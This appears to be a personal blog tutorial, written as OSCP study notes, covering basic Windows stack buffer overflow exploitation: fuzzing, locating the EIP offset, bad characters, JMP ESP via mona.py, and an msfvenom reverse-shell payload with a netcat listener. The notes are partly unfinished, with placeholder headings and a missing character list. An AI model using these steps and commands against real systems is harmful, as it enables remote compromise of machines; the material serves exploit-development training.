---
title:  "Basic Buffer Overflows"
header: "Basic Buffer Overflows"
categories: 
  - Tutorial
tags:
  - Hacking
---

A lot can be said about buffer overflows and they are perhaps the most daunting part of attempting the OSCP for most. However, as you&#39;ll find in most of your offensive hacking endeavors, it&#39;s all about experimentation and tweaking your process. Below are the notes I used to successfully exploit several applications (given they didn&#39;t have standard security such as ASLR or DEP) and serves as a good example of understanding a basic buffer overflow.

_I&#39;ll go and make this look pretty and add pictures later but this should get you started in the meantime_

**Fuzz the application**

If you don&#39;t have access to the code and there aren&#39;t any publicly disclosed exploits then another viable option is to fuzz the application and see what happens. Fuzzing is essentially the act of sending malformed or unintended data to an application and watching to see if it behaves abnormally such as crashing. Keep in mind that just because you cause an application to crash doesn&#39;t necessarily mean that it&#39;s vulnerable but it should key you into paying closer attention to it.

- Run the application
- Attach the debugger (Immunity is a good option) to the application
- Run your fuzzer
- Write a script to replicate the crash (this is where you&#39;ll set the size of the buffer)

**Find out which part of the buffer overwrites EIP**

Explain EIP and ESP

Explain static tree analysis

- Create a unique string that&#39;s the size of your buffer (pattern\_create.rb is great for this, comes with Kali!)
  - Usage: pattern\_create.rb 2200 &lt;-- size of your buffer
- Place the output inside your script
- Run script and locate EIP&#39;s bytes
- Use pattern\_offset.rb to find the position from your pattern\_create script
  - Usage: pattern-offset.rb 13731415 &lt;--EIP value from crash
- It should return your location (something like 1403). This means that on the 1404th byte is where you can direct EIP. A good way to test this is to send a certain amount of A&#39;s, B&#39;s, and C&#39;s to see where the values are located
  - Example: buffer = &quot;A&quot;\*1403 + &quot;B&quot;\*4 + &quot;C&quot;\*793 &lt;----the last part is to fulfill the orginial 2200 buffer

**(Optional) Increase the buffer size to allow room for shellcode**

The average size for shellcode is around 350-400 so you&#39;ll need to have roughly that much space left in the buffer. If you don&#39;t have enough then it&#39;s a good idea to increase the padding on your buffer either before or after the EIP director bytes.

**Discover bad characters**

To me this can be the most frustrating part of the process and often where people slip up. It&#39;s not so much that it&#39;s difficult but rather just tedious and attention to detail can go a long way. The purpose in discovering bad characters is to ensure that our shellcode doesn&#39;t get modified (truncated, character replaced, terminated). Null values and carriage returns are notoriously bad characters.

- Place the below character listing in your fuzzer
- Run the fuzzer
- Look at memory location of ESP
- Discover where the increments are broken and/or malformed
- Remove the character from the buffer and continue until you&#39;ve completed them all

**Redirect EIP**

When the application starts each time you&#39;ll notice that your pointers are at different locations. To ensure that we always hit our shellcode, we&#39;ll need a solid/static location with each restart. There are a couple of requirements in this instance (this is just a basic example). Needs to be readable and executable and can&#39;t have DEP or ASLR enabled. A good place to look is any accompanying DLL&#39;s with the application. A good tool to help discover potential modules is mona.py, which once again comes with Kali.

- Once you&#39;ve found a solid module, you&#39;ll want to search for JMP ESP&#39;s within immunity
  - Search &gt; Sequence of Commands &gt; &quot;push esp (next line) retn&quot;
  - Search for jmp esp in the whole DLL
  - If you can&#39;t find one then the nasm\_shell command is FFE4 and you should search for that using mona.py
    - Usage: !mona find –s &quot;\xff\xe4&quot; –m &lt;vulnerable module&gt;
  - Test and place the location within your fuzzer

**Generate Shellcode**

Your shell code can be just about anything malicious that you want to do on the asset, but its typically used for returning a shell (but don&#39;t forget about other options like adding users, altering data, etc.,.). A basic tool to help with generating shellcode is msfvenom which is part of the Metasploit framework.

- In our example we&#39;re going to use a reverse shell and encode it with shikata\_ga\_nai (I highly recommend to explore some of the other encoders as they may be the only options with your bad characters combination)
  - Usage:  msfvenom -p windows/shell\_reverse\_tcp LHOST=&lt;ATTACKING\_IP&gt; LPORT=&lt;PORT NUMBER&gt; EXITFUNC=thread -f c –e x86/shikata\_ga\_nai -b &quot;&lt;BAD CHARACTERS&gt;
- Make note of the size of your shellcode as you&#39;ll need to account for it and ensure that you have the proper space
- Within your fuzzer, place a few NOP&#39;s (\x90) before the shellcode to ensure it has enough room to decode and it won&#39;t trip over itself

**Exploit**

You&#39;re ready to fire off your exploit! I recommend setting a breakpoint at the JMP ESP address to verify if the shellcode gets executed

- Set up a listener on the port number that you chose
  - Usage: nc –lvp &lt;PORT NUMBER&gt;
- Fire off your script and if everything works right you should be presented with a reverse shell from your target
